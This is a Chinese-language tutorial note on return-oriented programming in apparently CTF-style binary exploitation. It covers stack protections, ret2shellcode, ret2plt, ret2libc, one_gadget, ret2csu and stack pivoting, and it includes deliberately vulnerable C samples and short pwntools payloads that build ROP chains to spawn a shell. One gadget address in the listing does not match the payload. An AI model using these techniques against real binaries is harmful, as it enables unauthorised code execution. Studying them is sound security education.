# 第 9 天（上）：面向返回地址编程

## 程序的保护措施

### PIE 保护

整个程序 image 加载地址随机，所以各个段（如 .text 函数地址、.data 全局变量地址等）都变成未知的了。

（不过也许可以用 FSB 泄露出来。）

### 栈上的金丝雀：Stack Canary

这是一个插在栈里面的随机值，保护着 rbp 和返回地址。

```asm
mov    rax,QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8],rax
xor    eax,eax
......
mov    rsi,QWORD PTR [rbp-0x8]
xor    rsi,QWORD PTR fs:0x28
je     6e5 <func+0x7b>
call   540 <__stack_chk_fail@plt>
leave
ret
```

如果打算用栈溢出破坏程序，就会干掉这个金丝雀（随机值被你改掉了）。

而程序会判断金丝雀是否还活着。如果她没了，就代表这个栈已经被你给草了，程序就会终止。

### NX 保护

NX：Not eXecutable。一个段不能同时拥有“写”和“执行”属性。

也就是说可以写的地方不能跑，可以跑的地方不能写。否则我往你 .text 随便写点东西，你不就爆炸了？

## Return to Text

把返回地址劫持到 .text 段上已有的函数。

## Return to Shell Code

```cpp
void vul()
{
	char buffer[0x10];
	printf("buffer address: %p\n", buffer);
	gets(buffer);
}
```

没有 backdoor 函数了……但这是普遍情况。

```python
context.arch = "amd64"
p.recvuntil("buffer address: ")
stackloc = int(p.recv(12), 16)
tarloc = stackloc + 0x38
payload = b'b' * 0x18 + p64(tarloc) + b'b' * 0x18
payload += asm(shellcode)
```

但是，如果栈没有执行权限呢？

## 小工具 Gadgets

Gadgets 是用来构造 ROP 链的，一些来自源程序的合法代码段。

### ROPgadget，ropper

```shell
ROPgadget --binary xxx
```

## Return to PLT

程序中有很多的跳转，而其中有一些是依靠 PLT 表的。

那么如果我们修改 PLT 表的话，是否就可以合法地改变程序的运行流程？

```cpp
char str[] = "/bin/sh";
void prepare() { system("echo hello"); }
void vul()
{
	char buffer[32];
	gets(buffer);
}
```

该怎么拿到 shell 呢？

也就是说，执行 system 的时候怎么把 str 给它？

```python
context.arch = "amd64"
payload = b'b' * (8 * 5)
payload += p64(0x40101a) + p64(0x401223) + p64(0x404038) + p64(0x401050)
```

其中（来自 ROPgadget）：

```asm
0x40101a:
	ret ; 为了对齐
0x401223:
	pop rdi ; (rdi <- 0x404038)
	ret
0x404050:
	system@plt ; (rdi = 0x404038)
```

这样就用程序自己的代码把控制流改了，还把 str 的地址送给了 system。

但是，如果 system 不在 PLT 里面的话……

## Return to libc

libc 里面一定有个 system。但是这需要把 libc 泄露了。

```cpp
char str[] = "/bin/sh";
void vul()
{
	char buffer[32];
	printf("gets address: %p\n", printf);
	gets(buffer);
}
```

printf 函数在 libc 的段里面。那么 printf 和 system 的地址之间有什么关系？

但是，如果程序里面没有 "/bin/sh"……

### OneGadget

```shell
ldd xxx
one_gadget xxx/libc.so.6
```

### 参数控制的技巧

跳到后门不需要参数，跳到 system 只需要准备一个参数。那如果要准备更多参数呢？

多来几个 pop gadget 就行了。

## Return to csu

__libc_csu_init 是几乎所有没有阉割过的 ELF 中都存在的一个函数。它是用来干嘛的呢？

它本来是用来干嘛的对我们来说不重要，我们只需要知道它里面有很多控制寄存器的指令就行了。

## 栈迁移 Stack Pivot

```cpp
char string[0x100];

void prepare()
{
    system("echo who are you?");
    read(0, string, 0x100);
}

void vul()
{
    char buffer[16];
    read(0, buffer, 0x20);
}

int main(int argc, char *argv[])
{
    prepare();
    vul();
}
```

只给我们 0x20 的长度来溢出？也就是只能刚刚好到返回地址。

使用 leave 和 retn 创造一个假的 ebp，把栈迁移到那个 string 上。
